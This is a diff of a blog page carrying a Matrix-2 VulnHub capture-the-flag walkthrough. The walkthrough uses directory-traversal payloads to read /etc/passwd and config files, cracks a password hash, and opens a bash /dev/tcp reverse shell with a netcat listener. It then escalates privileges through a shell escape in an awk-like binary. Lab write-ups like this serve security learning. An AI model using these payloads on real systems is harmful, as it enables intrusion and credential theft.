@@ -6,10 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="To begin with, I took some time from my so called Busy routine XD and rooted Matrix-2 from vulnhub which is a successor to the Matrix series..If you haven’t checked the first one, Plz do .. if you re">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Matrix-2 Writeup">
 <meta property="og:url" content="https://mrt4ntr4.github.io/Matrix-2-Writeup/index.html">
 <meta property="og:site_name" content="mrT4ntr4&#39;s Blog">
+<meta property="og:description" content="To begin with, I took some time from my so called Busy routine XD and rooted Matrix-2 from vulnhub which is a successor to the Matrix series..If you haven’t checked the first one, Plz do .. if you re">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/redblue.jpg">
 <meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/1.png">
@@ -133,6 +135,8 @@
           <li><a href="/archives/">Posts</a></li>
          
           <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/art/">Art</a></li>
         
       </ul>
     </span>
@@ -220,87 +224,87 @@
   
 
   <div class="content" itemprop="articleBody">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/matrix2/redblue.jpg" title="banner" class="gallery-item"><img src="/img/matrix2/redblue.jpg" alt="banner"></a></p>
+    <div class=".post-images"><p><a href="/img/matrix2/redblue.jpg" title="banner" class="post-image-item"><img src="/img/matrix2/redblue.jpg" alt="banner"></a></p>
 <p>To begin with, I took some time from my so called <em>Busy</em> routine XD and rooted Matrix-2 from vulnhub which is a successor to the Matrix series..<br>If you haven’t checked the <a href="https://mrt4ntr4.github.io/Matrix-Writeup/" target="_blank">first one</a>, Plz do .. if you really are a MATRIX Fan. XD  </p>
 <p>Download <a href="https://www.vulnhub.com/entry/matrix-2,279/" target="_blank">here</a></p>
 <p>Also Thanks <a href="https://twitter.com/unknowndevice64" target="_blank">./unknowndevice64</a><br> for adding another child to the Matrix Series.  </p>
 <p>And you see, I keep my promise. For those of you who don’t know it, I promised that  I’ll bring my writeup on the second one in Matrix-1 writeup.</p>
 <p>So Yeah!! Our machine booted successfully..</p>
-<p><a href="/img/matrix2/1.png" class="gallery-item"><img src="/img/matrix2/1.png"></a></p>
+<p><a href="/img/matrix2/1.png" class="post-image-item"><img src="/img/matrix2/1.png"></a></p>
 <h1 id="Netdiscover-Scan"><a href="#Netdiscover-Scan" class="headerlink" title="Netdiscover Scan"></a>Netdiscover Scan</h1><p>To begin with, I did a netdiscover scan to find the IP of the matrix machine running on VirtualBox.  </p>
-<p><a href="/img/matrix2/2.png" class="gallery-item"><img src="/img/matrix2/2.png"></a></p>
+<p><a href="/img/matrix2/2.png" class="post-image-item"><img src="/img/matrix2/2.png"></a></p>
 <h1 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h1><p>And then moving on further, we get port 80, 1337, 12320 and 12322 as opened ports.  </p>
 <p>Hell these are a lot of ports.. ikr  </p>
-<p><a href="/img/matrix2/3.png" class="gallery-item"><img src="/img/matrix2/3.png"></a><br><a href="/img/matrix2/4.png" class="gallery-item"><img src="/img/matrix2/4.png"></a><br><a href="/img/matrix2/5.png" class="gallery-item"><img src="/img/matrix2/5.png"></a></p>
+<p><a href="/img/matrix2/3.png" class="post-image-item"><img src="/img/matrix2/3.png"></a><br><a href="/img/matrix2/4.png" class="post-image-item"><img src="/img/matrix2/4.png"></a><br><a href="/img/matrix2/5.png" class="post-image-item"><img src="/img/matrix2/5.png"></a></p>
 <p>And One more thing! Dirb Scan didn’t help.  </p>
 <h1 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h1><p>Checking the default HTTP Port ie 80, we get some twinking stars as background and my curiosity took me to <a href="https://codepen.io/WebSonick/pen/vjmgu" target="_blank">this</a> codepen’s snippet. And some text saying <strong>Welcome In Matrix v2, Mr.NEO</strong></p>
-<p><a href="/img/matrix2/6.png" class="gallery-item"><img src="/img/matrix2/6.png"></a></p>
+<p><a href="/img/matrix2/6.png" class="post-image-item"><img src="/img/matrix2/6.png"></a></p>
 <p>Further checking the source code of the page, I found a suspicious javascript file <strong>index.js</strong>  </p>
-<p><a href="/img/matrix2/7.png" class="gallery-item"><img src="/img/matrix2/7.png"></a></p>
+<p><a href="/img/matrix2/7.png" class="post-image-item"><img src="/img/matrix2/7.png"></a></p>
 <p>I didn’t know really what was it meant for.<br>Was it a part of the page’s animation stuff or just a troll related to the MATRIX Movie.<br>You might be wondering why does he even want us to know this shit…<br>But this shit was really not important XD.  </p>
-<p><a href="/img/matrix2/8.png" class="gallery-item"><img src="/img/matrix2/8.png"></a></p>
+<p><a href="/img/matrix2/8.png" class="post-image-item"><img src="/img/matrix2/8.png"></a></p>
 <p>So taking a keen look at some other ports.  </p>
 <p>I found that both ports 1337 and 12320 had a login prompt.  </p>
-<p><a href="/img/matrix2/9.png" class="gallery-item"><img src="/img/matrix2/9.png"></a></p>
-<p><a href="/img/matrix2/10.png" class="gallery-item"><img src="/img/matrix2/10.png"></a></p>
+<p><a href="/img/matrix2/9.png" class="post-image-item"><img src="/img/matrix2/9.png"></a></p>
+<p><a href="/img/matrix2/10.png" class="post-image-item"><img src="/img/matrix2/10.png"></a></p>
 <p>But the 12322 gave me a lead as the robots.txt had a disallowed entry for a file named <strong>file_view.php</strong></p>
-<p><a href="/img/matrix2/11.png" class="gallery-item"><img src="/img/matrix2/11.png"></a></p>
+<p><a href="/img/matrix2/11.png" class="post-image-item"><img src="/img/matrix2/11.png"></a></p>
 <p>Navigating to the file in our browser gave us a blank white page.. which is quite sad.  </p>
-<p><a href="/img/matrix2/12.png" class="gallery-item"><img src="/img/matrix2/12.png"></a></p>
+<p><a href="/img/matrix2/12.png" class="post-image-item"><img src="/img/matrix2/12.png"></a></p>
 <p>But no problem, we still have the almighty source.<br>And It commented <em>Error file parameter missing</em>  </p>
-<p><a href="/img/matrix2/13.png" class="gallery-item"><img src="/img/matrix2/13.png"></a>   </p>
+<p><a href="/img/matrix2/13.png" class="post-image-item"><img src="/img/matrix2/13.png"></a>   </p>
 <p>So I then used some parameters with a GET Request as well like …  </p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.42.201:12322/file_view.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
 <p>and still got the f** <strong>blank white page</strong>  </p>
 <p>But after some time, I tried my luck with Burp and to my surprise I was able to view the contents of <strong>/etc/passwd</strong> file and it was a directory traversal exploit.  </p>
-<p><a href="/img/matrix2/14.png" class="gallery-item"><img src="/img/matrix2/14.png"></a>  </p>
+<p><a href="/img/matrix2/14.png" class="post-image-item"><img src="/img/matrix2/14.png"></a>  </p>
 <p>As you can see from the Screenshot that I changed my Request to Post and especially the following :  </p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
 <p>This was really important with burp as it was simply showing that blank page repeatedly when tried with no Content-Type.<br>TBH It took a while to figure this out.. XD<br>Well I learnt something !!</p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file = ../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p><a href="/img/matrix2/15.png" class="gallery-item"><img src="/img/matrix2/15.png"></a>  </p>
+<p><a href="/img/matrix2/15.png" class="post-image-item"><img src="/img/matrix2/15.png"></a>  </p>
 <p>So Now we know that there is a user named <strong>n30</strong></p>
 <p>Not only this.. I was also able to see <strong>/proc/version</strong>  </p>
-<p><a href="/img/matrix2/16.png" class="gallery-item"><img src="/img/matrix2/16.png"></a>  </p>
+<p><a href="/img/matrix2/16.png" class="post-image-item"><img src="/img/matrix2/16.png"></a>  </p>
 <p>and <strong>/etc/crontab</strong>  to see the scheduled jobs.  </p>
-<p><a href="/img/matrix2/17.png" class="gallery-item"><img src="/img/matrix2/17.png"></a>  </p>
+<p><a href="/img/matrix2/17.png" class="post-image-item"><img src="/img/matrix2/17.png"></a>  </p>
 <p>Well <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">this</a> blogpost is really a heaven in case of Linux Priv Esc. </p>
 <p>And as we can observe the server is nginx in the Response Headers !! It was obvious to check <strong>/etc/nginx/sites-available/default</strong>  </p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file = ../../../../../etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
-<p><a href="/img/matrix2/18.png" class="gallery-item"><img src="/img/matrix2/18.png"></a>  </p>
+<p><a href="/img/matrix2/18.png" class="post-image-item"><img src="/img/matrix2/18.png"></a>  </p>
 <p>Here we see that a password is stored in <strong>/var/www/p4ss/.htpasswd</strong><br>Ok np lets take a look at that too.  </p>
-<p><a href="/img/matrix2/19.png" class="gallery-item"><img src="/img/matrix2/19.png"></a>  </p>
+<p><a href="/img/matrix2/19.png" class="post-image-item"><img src="/img/matrix2/19.png"></a>  </p>
 <p>And hell yeah we are presented with a password hash for a user named <strong>Tr1n17y</strong>     </p>
-<p><a href="/img/matrix2/20.png" class="gallery-item"><img src="/img/matrix2/20.png"></a>  </p>
+<p><a href="/img/matrix2/20.png" class="post-image-item"><img src="/img/matrix2/20.png"></a>  </p>
 <p>Now heading over to some noob methods of cracking a password hash, I use john with my wordlist as the common rockyou.txt.  </p>
-<p><a href="/img/matrix2/21.png" class="gallery-item"><img src="/img/matrix2/21.png"></a>  </p>
+<p><a href="/img/matrix2/21.png" class="post-image-item"><img src="/img/matrix2/21.png"></a>  </p>
 <p>Later, I use the following creds to login into 1337 port’s login prompt.  </p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: Tr1n17y</span><br><span class="line">Password: admin</span><br></pre></td></tr></table></figure>
-<p><a href="/img/matrix2/22.png" class="gallery-item"><img src="/img/matrix2/22.png"></a>  </p>
+<p><a href="/img/matrix2/22.png" class="post-image-item"><img src="/img/matrix2/22.png"></a>  </p>
 <p>Now, as we know from the /etc/passwd file that there is a user named n30. Here we get some red text with the same.  </p>
-<p><a href="/img/matrix2/23.png" class="gallery-item"><img src="/img/matrix2/23.png"></a>  </p>
+<p><a href="/img/matrix2/23.png" class="post-image-item"><img src="/img/matrix2/23.png"></a>  </p>
 <p>But going through the source, Everything looked similar to the 80’s port except all the css and js files were being imported from the <strong>/4cc3ss</strong> dir.  I don’t know whether there was another method of exploitation or anything like that..  </p>
-<p><a href="/img/matrix2/24.png" class="gallery-item"><img src="/img/matrix2/24.png"></a>  </p>
+<p><a href="/img/matrix2/24.png" class="post-image-item"><img src="/img/matrix2/24.png"></a>  </p>
 <p>Also there was a jpeg file commented out named <strong>h1dd3n.jpg</strong> which was a classic steganography chall.  </p>
-<p><a href="/img/matrix2/25.png" class="gallery-item"><img src="/img/matrix2/25.png"></a>  </p>
+<p><a href="/img/matrix2/25.png" class="post-image-item"><img src="/img/matrix2/25.png"></a>  </p>
 <p>I downloaded the image and used my own tool ie. <a href="https://github.com/mrT4ntr4/Stegall" target="_blank">Stegall</a> (AKA The father of all stego tools) XD.</p>
 <p>I used steghide with the password as n30 which can easily be guessed, atleast by me.  </p>
-<p><a href="/img/matrix2/26.png" class="gallery-item"><img src="/img/matrix2/26.png"></a>  </p>
+<p><a href="/img/matrix2/26.png" class="post-image-item"><img src="/img/matrix2/26.png"></a>  </p>
 <p>And Later I used these Creds to login into port 12322’s prompt.</p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: n30</span><br><span class="line">Password: p4$$w0rd</span><br></pre></td></tr></table></figure>
 <p>Now we can also get a reverse shell incase you don’t like a webshell like me.. XD<br>I used <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">this</a> reverse shell cheatsheet from pentestmonkey to grab a oneliner. </p>
 <p>I checked my IP and choosed my port to be 4433.  </p>
-<p><a href="/img/matrix2/27.png" class="gallery-item"><img src="/img/matrix2/27.png"></a>   </p>
+<p><a href="/img/matrix2/27.png" class="post-image-item"><img src="/img/matrix2/27.png"></a>   </p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><a href="/img/matrix2/28.png" class="gallery-item"><img src="/img/matrix2/28.png"></a>  </p>
+<p><a href="/img/matrix2/28.png" class="post-image-item"><img src="/img/matrix2/28.png"></a>  </p>
 <p>Well we require a listener also..  </p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4433</span><br></pre></td></tr></table></figure>
-<p><a href="/img/matrix2/29.png" class="gallery-item"><img src="/img/matrix2/29.png"></a>  </p>
+<p><a href="/img/matrix2/29.png" class="post-image-item"><img src="/img/matrix2/29.png"></a>  </p>
 <p>And as we know we are USER.</p>
-<p><a href="/img/matrix2/30.png" class="gallery-item"><img src="/img/matrix2/30.png"></a>  </p>
+<p><a href="/img/matrix2/30.png" class="post-image-item"><img src="/img/matrix2/30.png"></a>  </p>
 <h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>This was the easiest machine particularly for Priv Esc I’ve found on vulnhub.. as of now, as you can see there are barely 3 screenshots lying below XD</p>
 <p>Now I gather some info using <strong>ls</strong> ofc.<br>And my boy there it is <strong>.bash_history</strong>.  </p>
-<p><a href="/img/matrix2/31.png" class="gallery-item"><img src="/img/matrix2/31.png"></a>  </p>
+<p><a href="/img/matrix2/31.png" class="post-image-item"><img src="/img/matrix2/31.png"></a>  </p>
 <p>After reading its content, it is pretty obvious that someone had tried the command :</p>
 <pre><code class="sh">morpheus &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
 ```sh
@@ -323,12 +327,7 @@ And Hey If you like my posts please subscribe to my newsletter.. It&#39;ll barel
 Also If you have some suggestions for improvements and If I&#39;ve mistaken somewhere in explaining you can just write it down in the comments section.
 
 Meet you with another post!! Till then, Happy Hacking :)</code></pre>
-</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>
+</div>
   </div>
 </article>
 
@@ -348,6 +347,8 @@ Meet you with another post!! Till then, Happy Hacking :)</code></pre>
           <li><a href="/archives/">Posts</a></li>
          
           <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/art/">Art</a></li>
         
       </ul>
     </div>
@@ -389,7 +390,7 @@ Meet you with another post!! Till then, Happy Hacking :)</code></pre>
     Copyright &copy;
     
     
-    2021-2023
+    2021-2024
     Suraj Malhotra
   </div>
   <div class="footer-right">
@@ -403,6 +404,8 @@ Meet you with another post!! Till then, Happy Hacking :)</code></pre>
           <li><a href="/archives/">Posts</a></li>
          
           <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/art/">Art</a></li>
         
       </ul>
     </nav>
@@ -418,12 +421,47 @@ Meet you with another post!! Till then, Happy Hacking :)</code></pre>
 <link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
+<link rel="stylesheet" href="/lib/lightgallery/css/lightgallery.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-zoom.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-thumbnail.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-autoplay.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-transitions.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-fullscreen.css">
+
     <!-- jquery -->
 
 <script src="/lib/jquery/jquery.min.js"></script>
 
 
 <script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- lightgallery -->
+
+<script src="/lib/lightgallery/lightgallery.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/autoplay/lg-autoplay.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/fullscreen/lg-fullscreen.min.js"></script>
+
+
 
 <!-- clipboard -->
 
